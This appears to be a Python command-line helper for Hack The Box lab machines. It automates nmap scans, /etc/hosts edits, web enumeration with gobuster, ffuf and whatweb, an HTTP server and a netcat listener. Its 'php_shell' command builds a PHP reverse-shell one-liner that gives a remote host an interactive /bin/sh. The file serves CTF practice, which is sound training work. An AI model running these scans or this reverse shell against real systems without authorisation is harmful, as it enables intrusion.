#!/usr/bin/env python3

import subprocess
import os
import sys
import signal
import threading
import pickle
import readline
from termcolor import colored

skip_current_task = False
progress_file = 'progress.pkl'
state = {
    'ip': None,
    'hostname': None,
    'current_task': None,
    'open_web_ports': []
}

# Available commands
COMMANDS = [
    'nmap', 'run', 'host', 'check_ports', 'enumerate_web',
    'start_server', 'nc_listener', 'php_shell', 'exit'
]

def completer(text, state):
    options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

# Load command history
histfile = os.path.join(os.path.expanduser("~"), ".htb_enum_history")
try:
    readline.read_history_file(histfile)
    readline.set_history_length(1000)
except FileNotFoundError:
    pass

def save_history():
    readline.write_history_file(histfile)

def signal_handler(signum, frame):
    global skip_current_task
    skip_current_task = True
    print(colored("\nCtrl+K pressed. Skipping current task... 😅", "yellow"))

def save_progress():
    with open(progress_file, 'wb') as f:
        pickle.dump(state, f)

def load_progress():
    global state
    if os.path.exists(progress_file):
        with open(progress_file, 'rb') as f:
            state = pickle.load(f)

def run_with_timeout(cmd, timeout=300):
    global skip_current_task
    skip_current_task = False
    
    def target():
        subprocess.run(cmd, shell=True)
    
    thread = threading.Thread(target=target)
    thread.start()
    
    thread.join(timeout)
    if thread.is_alive():
        print(colored(f"Command timed out after {timeout} seconds. ⏰", "red"))
        skip_current_task = True

def check_installation(tool_name, install_cmd):
    try:
        subprocess.run([tool_name, '--version'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(colored(f"{tool_name} is already installed. ✅", "green"))
    except subprocess.CalledProcessError:
        print(colored(f"{tool_name} is not installed. Installing... 🔄", "yellow"))
        subprocess.run(install_cmd, shell=True)
        print(colored(f"{tool_name} installation completed. ✅", "green"))

def run_nmap():
    if not state['ip']:
        print(colored("IP address is not set. ❗", "red"))
        return

    print(colored("Running Nmap scan... 🔍", "blue"))
    nmap_cmd = f"nmap -sSVC {state['ip']} -oN nmap_scan.txt"
    run_with_timeout(nmap_cmd)
    if not skip_current_task:
        print(colored("Nmap scan completed. Results saved in nmap_scan.txt ✅", "green"))

def update_etc_hosts():
    if not state['ip'] or not state['hostname']:
        print(colored("IP address or hostname is not set. ❗", "red"))
        return

    print(colored("Updating /etc/hosts... 🛠️", "blue"))
    hosts_entry = f"{state['ip']}\t{state['hostname']}.htb"
    
    with open('/etc/hosts', 'r') as f:
        if state['hostname'] not in f.read():
            with open('/etc/hosts', 'a') as f:
                f.write(f"\n{hosts_entry}\n")
            print(colored(f"Added {hosts_entry} to /etc/hosts ✅", "green"))
        else:
            print(colored(f"Entry for {state['hostname']}.htb already exists in /etc/hosts ⚠️", "yellow"))

def check_web_ports():
    if not state['ip']:
        print(colored("IP address is not set. ❗", "red"))
        return

    web_ports = [80, 443, 8080, 5000]
    open_ports = []
    
    with open('nmap_scan.txt', 'r') as f:
        nmap_output = f.read()
    
    for port in web_ports:
        if f"{port}/tcp" in nmap_output and "open" in nmap_output.split(f"{port}/tcp")[1].split("\n")[0]:
            open_ports.append(port)
    
    state['open_web_ports'] = open_ports
    save_progress()

def enumerate_web():
    if not state['ip'] or not state['hostname']:
        print(colored("IP address or hostname is not set. ❗", "red"))
        return

    for port in state['open_web_ports']:
        print(colored(f"Enumerating web server on port {port}... 🌐", "blue"))
        
        # Get title
        curl_cmd = f"curl -s -I http://{state['hostname']}.htb:{port} | grep -i title"
        run_with_timeout(curl_cmd)
        if skip_current_task:
            continue

        # Check robots.txt
        robots_cmd = f"curl -s http://{state['hostname']}.htb:{port}/robots.txt"
        run_with_timeout(robots_cmd)
        if skip_current_task:
            continue

        # Detect CMS
        cms_cmd = f"whatweb http://{state['hostname']}.htb:{port}"
        run_with_timeout(cms_cmd)
        if skip_current_task:
            continue

        # Directory enumeration
        if prompt_user_for_tool('gobuster'):
            gobuster_cmd = f"gobuster dir -u http://{state['hostname']}.htb:{port} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50"
            run_with_timeout(gobuster_cmd)
            if skip_current_task:
                continue

        # Fuzz subdirectories
        if prompt_user_for_tool('ffuf'):
            ffuf_cmd = f"ffuf -u http://{state['hostname']}.htb:{port}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302"
            run_with_timeout(ffuf_cmd)

def prompt_user_for_tool(tool_name):
    while True:
        response = input(f"Do you want to run {tool_name}? (yes/no): ").strip().lower()
        if response in ['yes', 'no']:
            return response == 'yes'
        print("Please answer 'yes' or 'no'.")

def start_python_server():
    port = input("Enter port for Python3 web server: ").strip()
    print(colored(f"Starting Python3 web server on port {port}... 🌐", "blue"))
    server_cmd = f"python3 -m http.server {port}"
    subprocess.run(server_cmd, shell=True)

def start_nc_listener():
    port = input("Enter port for nc listener: ").strip()
    print(colored(f"Starting nc listener on port {port}... 📡", "blue"))
    nc_cmd = f"nc -lnvp {port}"
    subprocess.run(nc_cmd, shell=True)

def execute_php_shell():
    ip = input("Enter your IP for reverse shell: ").strip()
    port = input("Enter your port for reverse shell: ").strip()
    php_cmd = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    print(colored(f"PHP reverse shell command: {php_cmd}", "blue"))

def display_logo():
    logo = """
    _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
   / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
  ( H | T | B | E | n | u | m | e | r | a | t | o | r |   |   )
   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
    """
    print(colored(logo, "cyan"))

def main():
    if os.geteuid() != 0:
        print(colored("This script must be run as root. Please use sudo. ❗", "red"))
        sys.exit(1)

    # Set up signal handler for Ctrl+K
    signal.signal(signal.SIGTSTP, signal_handler)
    
    # Load progress if available
    load_progress()
    
    # Display logo
    display_logo()

    # Check and install necessary tools
    check_installation('nmap', 'sudo apt-get install -y nmap')
    check_installation('gobuster', 'sudo apt-get install -y gobuster')
    check_installation('ffuf', 'sudo apt-get install -y ffuf')
    check_installation('whatweb', 'sudo apt-get install -y whatweb')

    while True:
        try:
            command = input("htb_enum > ").strip().lower()

            if command == 'exit':
                print(colored("Exiting... ❗", "red"))
                break
            elif command == 'nmap':
                ip = input("Set IP: ").strip()
                state['ip'] = ip
                print(colored(f"IP is set to {ip}", "green"))
                save_progress()
            elif command == 'run':
                run_nmap()
            elif command == 'host':
                hostname = input("Set Hostname: ").strip()
                state['hostname'] = hostname
                print(colored(f"Hostname is set to {hostname}", "green"))
                update_etc_hosts()
                save_progress()
            elif command == 'check_ports':
                check_web_ports()
                print(colored(f"Open web ports: {state['open_web_ports']}", "green"))
            elif command == 'enumerate_web':
                enumerate_web()
            elif command == 'start_server':
                start_python_server()
            elif command == 'nc_listener':
                start_nc_listener()
            elif command == 'php_shell':
                execute_php_shell()
            else:
                print(colored("Unknown command. ❗", "red"))
                print("Available commands: nmap, run, host, check_ports, enumerate_web, start_server, nc_listener, php_shell, exit")
        except EOFError:
            print("\nUse 'exit' to quit the program.")
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit the program.")

    save_history()

if __name__ == "__main__":
    main()
